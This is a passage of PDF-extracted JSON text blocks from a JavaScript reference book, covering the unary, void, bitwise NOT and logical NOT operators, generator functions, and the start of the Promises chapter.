        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The unary plus ( + ) precedes its operand  and evaluates  to its operand. It attempts to convert the operand to a number, if it isn't already.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Syntax:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "+ expression",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Returns:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "a  Number .",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Description",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The unary plus ( + ) operator is the fastest (and preferred) method of converting something into a number. It can convert: string representations of integers (decimal or hexadecimal) and \ufb02oats. booleans:  true ,  false . null Values that can't be converted will evaluate to  NaN .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Examples:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "+ 42             // 42",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 254",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "+ \"42\"           // 42 + true           // 1 + false          // 0 + null           // 0",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "+ undefined      // NaN",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "+ NaN            // NaN + \"foo\"          // NaN +{}             // NaN",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "+ function (){}   // NaN",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note that attempting to convert an array can result in unexpected return values. In the background, arrays are \ufb01rst converted to their string representations:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[] . toString ()   ===   '' ; [ 1 ] . toString ()   ===   '1' ; [ 1 ,   2 ] . toString ()   ===   '1,2' ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The operator then attempts to convert those strings to numbers:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "+[]             // 0   ( === +'' ) +[ 1 ]            // 1   ( === +'1' ) +[ 1 ,   2 ]         // NaN ( === +'1,2' )",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 40.5: The void operator",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  void  operator evaluates the given expression and then returns  undefined .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Syntax:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "void  expression",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Returns:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "undefined",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Description",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The  void  operator is often used to obtain the  undefined  primitive value, by means of writing  void   0  or  void ( 0 ) . Note that  void  is an operator, not a function, so  ()  is not required. Usually the result of a  void  expression and  undefined  can be used interchangeably. However, in older versions of ECMAScript,  window. undefined  could be assigned any value, and it is still possible to use  undefined  as name for function parameters variables inside functions, thus disrupting other code that relies on the value of  undefined . void  will always yield the  true   undefined  value though. void   0  is also commonly used in code mini\ufb01cation as a shorter way of writing  undefined . In addition, it's probably safer as some other code could've tampered with  window. undefined .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Examples:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Returning  undefined :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  foo (){      return   void   0 ; }",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( foo ());   // undefined",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 255",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Changing the value of  undefined  inside a certain scope:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "( function ( undefined ){",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     var  str  =   'foo' ;     console. log ( str  ===   undefined );   // true })( 'foo' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 40.6: The unary negation operator (-)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The unary negation ( - ) precedes its operand and negates it, after trying to convert it to number.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Syntax:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "- expression",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Returns:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "a  Number .",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Description",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The unary negation ( - ) can convert the same types / values as the unary plus ( + ) operator can. Values that can't be converted will evaluate to  NaN  (there is no  - NaN ).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Examples:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "- 42             // -42 - \"42\"           // -42 - true           // -1 - false          // -0 - null           // -0",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "- undefined      // NaN",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "- NaN            // NaN - \"foo\"          // NaN -{}             // NaN",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "- function (){}   // NaN",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note that attempting to convert an array can result in unexpected return values. In the background, arrays are \ufb01rst converted to their string representations:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[] . toString ()   ===   '' ; [ 1 ] . toString ()   ===   '1' ; [ 1 ,   2 ] . toString ()   ===   '1,2' ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The operator then attempts to convert those strings to numbers:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "-[]             // -0  ( === -'' ) -[ 1 ]            // -1  ( === -'1' ) -[ 1 ,   2 ]         // NaN ( === -'1,2' )",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 40.7: The bitwise NOT operator (~)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The bitwise NOT ( ~ ) performs a NOT operation on each bit in a value.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Syntax:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "~expression",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Returns:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 256",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "a  Number .",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Description",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The truth table for the NOT operation is:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "a NOT a 0 1 1 0",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "1337    ( base  10 )   =  0000010100111001  ( base  2 ) ~ 1337   ( base  10 )   =   1111101011000110   ( base  2 )   =   - 1338   ( base  10 )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "A bitwise not on a number results in:  -( x  +   1 ) .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Examples: value (base 10) value (base 2) return (base 2) return (base 10) 2",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "00000010 11111100 -3 1 00000001 11111110 -2 0 00000000 11111111 -1 -1 11111111 00000000 0 -2 11111110 00000001 1 -3 11111100 00000010 2",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 40.8: The logical NOT operator (!)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The logical NOT ( ! ) operator performs logical negation on an expression.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Syntax:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "! expression",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Returns:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "a  Boolean .",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Description",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The logical NOT ( ! ) operator performs logical negation on an expression. Boolean values simply get inverted:  ! true   ===   false  and  ! false   ===   true . Non-boolean values get converted to boolean values \ufb01rst, then are negated. This means that a double logical NOT ( !! ) can be used to cast any value to a boolean:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "!! \"FooBar\"   ===   true !! 1   ===   true !! 0   ===   false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "These are all equal to  ! true :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "! 'true'   ===   ! new  Boolean ( 'true' ); ! 'false'   ===   ! new  Boolean ( 'false' ); ! 'FooBar'   ===   ! new  Boolean ( 'FooBar' ); ![]   ===   ! new  Boolean ([]); !{}   ===   ! new  Boolean ({});",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "These are all equal to  ! false :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 257",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "! 0   ===   ! new  Boolean ( 0 ); ! ''   ===   ! new  Boolean ( '' ); ! NaN   ===   ! new  Boolean ( NaN ); ! null   ===   ! new  Boolean ( null );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "! undefined   ===   ! new  Boolean ( undefined );",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Examples:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "! true           // false !- 1             // false ! \"-1\"           // false ! 42             // false ! \"42\"           // false ! \"foo\"          // false ! \"true\"         // false ! \"false\"        // false !{}             // false ![]             // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "! function (){}   // false",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "! false          // true ! null           // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "! undefined      // true",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "! NaN            // true ! 0              // true ! \"\"             // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 258",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 41: Generators",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Generator functions (de\ufb01ned by the  function *  keyword) run as coroutines, generating a series of values as they're requested through an iterator.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 41.1: Generator Functions",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "A  generator function  is created with a  function *  declaration. When it is called, its body is  not  immediately executed. Instead, it returns a  generator object , which can be used to \"step through\" the function's execution. A  yield  expression inside the function body de\ufb01nes a point at which execution can suspend and resume.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function *  nums ()   {     console. log ( 'starting' );    // A     yield  1 ;                    // B     console. log ( 'yielded 1' );   // C     yield  2 ;                    // D     console. log ( 'yielded 2' );   // E     yield  3 ;                    // F     console. log ( 'yielded 3' );   // G }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  generator  =  nums ();   // Returns the iterator. No code in nums is executed generator. next ();    // Executes lines A,B returning { value: 1, done: false } // console: \"starting\" generator. next ();    // Executes lines C,D returning { value: 2, done: false } // console: \"yielded 1\" generator. next ();    // Executes lines E,F returning { value: 3, done: false } // console: \"yielded 2\" generator. next ();    // Executes line G returning { value: undefined, done: true } // console: \"yielded 3\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Early iteration exit",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "generator  =  nums ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "generator. next ();   // Executes lines A,B returning { value: 1, done: false } generator. next ();   // Executes lines C,D returning { value: 2, done: false } generator. return ( 3 );   // no code is executed returns { value: 3, done: true } // any further calls will return done = true generator. next ();   // no code executed returns { value: undefined, done: true }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Throwing an error to generator function",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function *  nums ()   {      try   {         yield  1 ;                    // A         yield  2 ;                    // B         yield  3 ;                    // C      }   catch   ( e )   {         console. log ( e. message );      // D      } } var  generator  =  nums ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "generator. next ();    // Executes line A returning { value: 1, done: false } generator. next ();    // Executes line B returning { value: 2, done: false } generator. throw ( new  Error ( \"Error!!\" ));    // Executes line D returning { value: undefined, done: true} // console: \"Error!!\" generator. next ();    // no code executed. returns { value: undefined, done: true }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 259",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 41.2: Sending Values to Generator",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "It is possible to  send  a value to the generator by passing it to the  next ()  method.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function *  summer ()   {      let  sum  =   0 ,  value ;     while  ( true )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // receive sent value",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "        value  =  yield ;          if   ( value  ===   null )   break ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // aggregate values",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "        sum  +=  value ;      }      return  sum ; } let  generator  =  summer ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// proceed until the first \"yield\" expression, ignoring the \"value\" argument",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "generator. next ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// from this point on, the generator aggregates values until we send \"null\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "generator. next ( 1 ); generator. next ( 10 ); generator. next ( 100 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// close the generator and collect the result",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "let  sum  =  generator. next ( null ) . value ;    // 111",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 41.3: Delegating to other Generator",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "From within a generator function, the control can be delegated to another generator function using  yield * .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function *  g1 ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  yield  2 ;   yield  3 ;   yield  4 ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function *  g2 ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  yield  1 ;   yield *  g1 ();   yield  5 ; } var  it  =  g2 (); console. log ( it. next ());   // 1 console. log ( it. next ());   // 2 console. log ( it. next ());   // 3 console. log ( it. next ());   // 4 console. log ( it. next ());   // 5 console. log ( it. next ());   // undefined",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 41.4: Iteration",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "A generator is  iterable . It can be looped over with a  for ... of  statement, and used in other constructs which depend on the iteration protocol.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 260",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function *  range ( n )   {      for   ( let  i  =   0 ;  i  <  n ;   ++ i )   {         yield i ;      } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// looping",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "for   ( let  n of range ( 10 ))   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // n takes on the values 0, 1, ... 9 } // spread operator",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "let  nums  =   [ ... range ( 3 )];    // [0, 1, 2] let  max  =  Math. max ( ... range ( 100 ));    // 99",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Here is another example of use generator to custom iterable object in ES6. Here anonymous generator function",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function   *  used.",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "let  user  =   {   name :   \"sam\" ,  totalReplies :   17 ,  isBlocked :   false }; user [ Symbol. iterator ]   =   function   *(){    let  properties  =  Object. keys ( this );    let  count  =   0 ;    let  isDone  =   false ;    for ( let  p of properties ){     yield  this [ p ];    } }; for ( let  p of user ){   console. log (  p  ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 41.5: Async \ufb02ow with generators",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Generators are functions which are able to pause and then resume execution. This allows to emulate async functions using external libraries, mainly q or co. Basically it allows to write functions that wait for async results in order to go on:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  someAsyncResult ()   {      return  Promise. resolve ( 'newValue' ) } q. spawn ( function   *   ()   {      var  result  =  yield someAsyncResult ()     console. log ( result )   // 'newValue' })",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This allows to write async code as if it were synchronous. Moreover, try and catch work over several async blocks. If the promise is rejected, the error is caught by the next catch:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  asyncError ()   {      return   new  Promise ( function   ( resolve ,  reject )   {         setTimeout ( function   ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 261",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "            reject ( new  Error ( 'Something went wrong' ))          },   100 )      }) } q. spawn ( function   *   ()   {      try   {          var  result  =  yield asyncError ()      }   catch   ( e )   {         console. error ( e )   // Something went wrong      } })",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Using co would work exactly the same but with  co ( function   *   (){ ... })  instead of  q. spawn",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 41.6: Iterator-Observer interface",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "A generator is a combination of two things - an  Iterator  and an  Observer .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Iterator",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "An iterator is something when invoked returns an  iterable . An  iterable  is something you can iterate upon. From ES6/ES2015 onwards, all collections (Array, Map, Set, WeakMap, WeakSet) conform to the Iterable contract. A generator(iterator) is a producer. In iteration the consumer  PULL s the value from the producer. Example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function   * gen ()   {  yield  5 ;  yield  6 ;   } let  a  =  gen ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Whenever you call  a. next () , you're essentially  pull -ing value from the Iterator and  pause  the execution at  yield . The next time you call  a. next () , the execution resumes from the previously paused state.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Observer",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "A generator is also an observer using which you can send some values back into the generator.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function   * gen ()   {   document. write ( '<br>observer:' ,  yield  1 ); } var  a  =  gen (); var  i  =  a. next (); while (! i. done )   {   document. write ( '<br>iterator:' ,  i. value );   i  =  a. next ( 100 ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Here you can see that  yield  1  is used like an expression which evaluates to some value. The value it evaluates to is the value sent as an argument to the  a. next  function call. So, for the \ufb01rst time  i. value  will be the \ufb01rst value yielded ( 1 ), and when continuing the iteration to the next state, we send a value back to the generator using  a. next ( 100 ) .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Doing async with Generators",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 262",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Generators are widely used with  spawn  (from taskJS or co) function, where the function takes in a generator and allows us to write asynchronous code in a synchronous fashion. This does NOT mean that async code is converted to sync code / executed synchronously. It means that we can write code that looks like  sync  but internally it is still",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "async .",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Sync is BLOCKING; Async is WAITING. Writing code that blocks is easy. When PULLing, value appears in the assignment position. When PUSHing, value appears in the argument position of the callback. When you use iterators, you  PULL  the value from the producer. When you use callbacks, the producer  PUSH es the value to the argument position of the callback.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  i  =  a. next ()   // PULL dosomething ( ... ,  v  =>   { ... })   // PUSH",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Here, you pull the value from  a. next ()  and in the second,  v  =>   { ... }  is the callback and a value is  PUSH ed into the argument position  v  of the callback function. Using this pull-push mechanism, we can write async programming like this,",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  delay  =  t  =>   new  Promise ( r  =>  setTimeout ( r ,  t )); spawn ( function *()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // wait for 100 ms and send 1",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   let  x  =  yield delay ( 100 ) . then (()   =>   1 );   console. log ( x );   // 1",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    // wait for 100 ms and send 2",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   let  y  =  yield delay ( 100 ) . then (()   =>   2 );   console. log ( y );   // 2 });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "So, looking at the above code, we are writing async code that looks like it's  blocking  (the yield statements wait for 100ms and then continue execution), but it's actually  waiting . The  pause  and  resume  property of generator allows us to do this amazing trick.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "How does it work ?",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The spawn function uses  yield promise  to PULL the promise state from the generator, waits till the promise is resolved, and PUSHes the resolved value back to the generator so it can consume it.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Use it now",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "So, with generators and spawn function, you can clean up all your async code in NodeJS to look and feel like it's synchronous. This will make debugging easy. Also the code will look neat. This feature is coming to future versions of JavaScript - as  async... await . But you can use them today in ES2015/ES6 using the spawn function de\ufb01ned in the libraries - taskjs, co, or bluebird",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 263",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 42: Promises",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 42.1: Introduction",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "A  Promise  object represents an operation which  has produced or will eventually produce  a value. Promises provide a robust way to wrap the (possibly pending) result of asynchronous work, mitigating the problem of deeply nested callbacks (known as \" callback hell \").",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "States and control \ufb02ow",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "A promise can be in one of three states: pending   \u2014  The underlying operation has not yet completed, and the promise is  pending  ful\ufb01llment. ful\ufb01lled   \u2014  The operation has \ufb01nished, and the promise is  ful\ufb01lled  with a  value . This is analogous to returning a value from a synchronous function. rejected   \u2014  An error has occurred during the operation, and the promise is  rejected  with a  reason . This is analogous to throwing an error in a synchronous function. A promise is said to be  settled  (or  resolved ) when it is either ful\ufb01lled or rejected. Once a promise is settled, it becomes immutable, and its state cannot change. The  then  and  catch  methods of a promise can be used to attach callbacks that execute when it is settled. These callbacks are invoked with the ful\ufb01llment value and rejection reason, respectively.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Example",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": [
            "output_directory\\image_279_1.png"
        ]
    },
    {
        "text": "const  promise  =   new  Promise (( resolve ,  reject )   =>   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // Perform some work (possibly asynchronous)      // ...      if   ( /* Work has successfully finished and produced \"value\" */ )   {",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "        resolve ( value );      }   else   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // Something went wrong because of \"reason\"          // The reason is traditionally an Error object, although          // this is not required or enforced.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         let  reason  =   new  Error ( message );         reject ( reason );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // Throwing an error also rejects the promise.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         throw  reason ;      } });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  then  and  catch  methods can be used to attach ful\ufb01llment and rejection callbacks:",
        "font_name": "OpenSans",
        "font_size": 10,
